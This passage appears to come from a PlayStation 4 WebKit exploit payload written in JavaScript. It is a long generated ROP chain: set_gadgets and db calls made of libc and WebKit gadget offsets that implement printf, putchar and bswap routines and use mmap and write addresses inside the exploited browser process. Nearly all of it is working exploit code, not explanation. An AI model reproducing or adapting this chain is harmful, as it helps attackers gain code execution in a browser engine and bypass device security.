libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+160328,//L2348
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L2348:
db([0,0]);
//L2121:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
mmap_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+161656,//L2349
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L2349:
db([0,0]);
//_printf_:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+161728,//L2351
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2351:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+161792,//L2353
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2353:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+161896,//L2354
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+161912,//L2355
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2354:
db([0,0]);
set_gadget(libc_base+768796,);
//L2355:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+162032,//L2356
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+162016,//L2357
webkit_base+4687784,
libc_base+768796
]);
//L2357:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2356:
db([0,0]);
//__putchar:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+162104,//L2359
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2359:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+162208,//L2361
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+162224,//L2362
webkit_base+4687784,
libc_base+768796
]);
//L2360:
db([0,0]);
set_gadget(webkit_base+1420514,);//pop r8
//L2361:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L2362:
db([0,0]);
set_gadget(libc_base+165442,);
//L2363:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+162336,//L2365
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+162320,//L2364
webkit_base+4687784,
libc_base+165442
]);
//L2364:
db([0,0]);
set_gadget(libc_base+768796,);
//L2365:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+162472,//L2368
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+162456,//L2367
webkit_base+4687784,
libc_base+165442,
//L2366:
ropchain+136,//_ps4_printf_fd
libc_base+772328
]);
//L2367:
db([0,0]);
set_gadget(libc_base+768796,);
//L2368:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+162632,//L2370
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+162664,//L2372
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+162616,//L2369
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+162648,//L2371
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2369:
db([0,0]);
set_gadget(libc_base+165442,);
//L2370:
db([0,0]);
set_gadget(libc_base+772328,);
//L2371:
db([0,0]);
set_gadget(libc_base+768796,);
//L2372:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+162744,//L2373
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+162760,//L2374
webkit_base+4687784,
libc_base+165442
]);
//L2373:
db([0,0]);
set_gadget(libc_base+768796,);
//L2374:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+162888,//L2376
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+162904,//L2377
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+162872,//L2375
webkit_base+4687784,
libc_base+165442
]);
//L2375:
db([0,0]);
set_gadget(libc_base+772328,);
//L2376:
db([0,0]);
set_gadget(libc_base+768796,);
//L2377:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+8949069,//setle al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+163080,//L2379
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+163096,//L2380
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+163064,//L2378
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2378:
db([0,0]);
set_gadget(libc_base+165442,);
//L2379:
db([0,0]);
set_gadget(libc_base+768796,);
//L2380:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+163224,//L2383
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+163256,//L2385
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+163240,//L2384
webkit_base+4687784,
libc_base+713278
]);
//L2382:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L2383:
db([0,0]);
set_gadget(libc_base+165442,);
//L2384:
db([0,0]);
set_gadget(libc_base+768796,);
//L2385:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+163368,//L2386+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+163360,//L2386
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L2386:
db([0,0]);
set_gadgets([
ropchain+163384,//L2386+24
ropchain+164216,//L2381
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+163440,//L2388
webkit_base+4687784,
libc_base+768796
]);
//L2387:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L2388:
db([0,0]);
set_gadget(libc_base+165442,);
//L2389:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+163552,//L2391
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+163536,//L2390
webkit_base+4687784,
libc_base+165442
]);
//L2390:
db([0,0]);
set_gadget(libc_base+768796,);
//L2391:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+163648,//L2393
webkit_base+4687784,
libc_base+713278
]);
//L2392:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L2393:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+163792,//L2396
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+163776,//L2395
webkit_base+4687784,
libc_base+165442,
//L2394:
ropchain+136,//_ps4_printf_fd
libc_base+772328
]);
//L2395:
db([0,0]);
set_gadget(libc_base+768796,);
//L2396:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+163952,//L2398
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+163984,//L2400
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+163936,//L2397
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+163968,//L2399
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2397:
db([0,0]);
set_gadget(libc_base+165442,);
//L2398:
db([0,0]);
set_gadget(libc_base+772328,);
//L2399:
db([0,0]);
set_gadget(libc_base+768796,);
//L2400:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+164080,//L2402
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+164064,//L2401
webkit_base+4687784,
libc_base+165442
]);
//L2401:
db([0,0]);
set_gadget(libc_base+768796,);
//L2402:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2404:
ropchain+164184,//L2403
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+166648,//L2405
//L2403:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
//L2381:
libc_base+713278,
ropchain+164272,//L2408
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2406:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2408:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+164360,//L2410
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+164376,//L2411
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2410:
db([0,0]);
set_gadget(libc_base+772328,);
//L2411:
db([0,0]);
set_gadgets([
libc_base+229136,//mov al,[rdi]
libc_base+713278,
ropchain+164536,//L2415
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+164488,//L2412
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+164504,//L2413
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2412:
db([0,0]);
set_gadget(libc_base+165442,);
//L2413:
db([0,0]);
set_gadget(libc_base+772328,);
//L2414:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L2415:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+164592,//L2417
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L2417:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+164704,//L2418
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+164736,//L2420
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+164720,//L2419
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2418:
db([0,0]);
set_gadget(libc_base+772328,);
//L2419:
db([0,0]);
set_gadget(libc_base+768796,);
//L2420:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+164896,//L2424
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+164848,//L2421
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+164864,//L2422
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2421:
db([0,0]);
set_gadget(libc_base+165442,);
//L2422:
db([0,0]);
set_gadget(libc_base+772328,);
//L2423:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L2424:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+164952,//L2426
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L2426:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+165064,//L2427
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+165096,//L2429
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+165080,//L2428
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2427:
db([0,0]);
set_gadget(libc_base+772328,);
//L2428:
db([0,0]);
set_gadget(libc_base+768796,);
//L2429:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+165176,//L2430
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+165192,//L2431
webkit_base+4687784,
libc_base+165442
]);
//L2430:
db([0,0]);
set_gadget(libc_base+768796,);
//L2431:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+165352,//L2435
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+165304,//L2432
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+165320,//L2433
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2432:
db([0,0]);
set_gadget(libc_base+165442,);
//L2433:
db([0,0]);
set_gadget(libc_base+772328,);
//L2434:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L2435:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+165408,//L2437
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L2437:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+165520,//L2438
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+165552,//L2440
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+165536,//L2439
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2438:
db([0,0]);
set_gadget(libc_base+772328,);
//L2439:
db([0,0]);
set_gadget(libc_base+768796,);
//L2440:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+165648,//L2442
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+165632,//L2441
webkit_base+4687784,
libc_base+165442
]);
//L2441:
db([0,0]);
set_gadget(libc_base+768796,);
//L2442:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+165784,//L2445
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+165768,//L2444
webkit_base+4687784,
libc_base+165442,
//L2443:
ropchain+128,//_ps4_printf_buffer
libc_base+772328
]);
//L2444:
db([0,0]);
set_gadget(libc_base+768796,);
//L2445:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+165928,//L2448
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+165896,//L2446
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+165912,//L2447
webkit_base+4687784,
libc_base+165442
]);
//L2446:
db([0,0]);
set_gadget(libc_base+772328,);
//L2447:
db([0,0]);
set_gadget(libc_base+768796,);
//L2448:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+166016,//L2450
webkit_base+4687784,
libc_base+713278
]);
//L2449:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L2450:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+166080,//L2452
webkit_base+4687784,
libc_base+768796,
//L2451:
ropchain+128,//_ps4_printf_buffer
libc_base+772328
]);
//L2452:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+713278,
ropchain+166136,//L2454
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2454:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+166216,//L2456
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2456:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+166272,//L2458
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2458:
db([0,0]);
set_gadgets([
webkit_base+887232,//mov [rax],cl
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+166400,//L2460
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+166384,//L2459
webkit_base+4687784,
libc_base+165442
]);
//L2459:
db([0,0]);
set_gadget(libc_base+768796,);
//L2460:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+166504,//L2461
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+166520,//L2462
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2461:
db([0,0]);
set_gadget(libc_base+768796,);
//L2462:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+166640,//L2463
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+166624,//L2464
webkit_base+4687784,
libc_base+768796
]);
//L2464:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2463:
db([0,0]);
//L2405:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
write_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+167968,//L2465
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L2465:
db([0,0]);
//___bswap64_var:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+168040,//L2467
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2467:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+168152,//L2470
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+168168,//L2471
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
//L2468:
db([16,0]);// 0x10
set_gadget(webkit_base+1420514,);//pop r8
//L2470:
db([0,0]);
set_gadget(libc_base+772328,);
//L2471:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+168256,//L2473
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+168272,//L2474
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2473:
db([0,0]);
set_gadget(libc_base+772328,);
//L2474:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+168400,//L2476
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+168416,//L2477
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+168384,//L2475
webkit_base+4687784,
libc_base+165442
]);
//L2475:
db([0,0]);
set_gadget(libc_base+772328,);
//L2476:
db([0,0]);
set_gadget(libc_base+768796,);
//L2477:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+168520,//L2478
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+168536,//L2479
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2478:
db([0,0]);
set_gadget(libc_base+768796,);
//L2479:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+168656,//L2480
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+168640,//L2481
webkit_base+4687784,
libc_base+768796
]);
//L2481:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2480:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+168744,//L2483
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+168728,//L2482
webkit_base+4687784,
libc_base+165442
]);
//L2482:
db([0,0]);
set_gadget(libc_base+768796,);
//L2483:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+168848,//L2484
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+168864,//L2485
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2484:
db([0,0]);
set_gadget(libc_base+768796,);
//L2485:
db([0,0]);
set_gadgets([
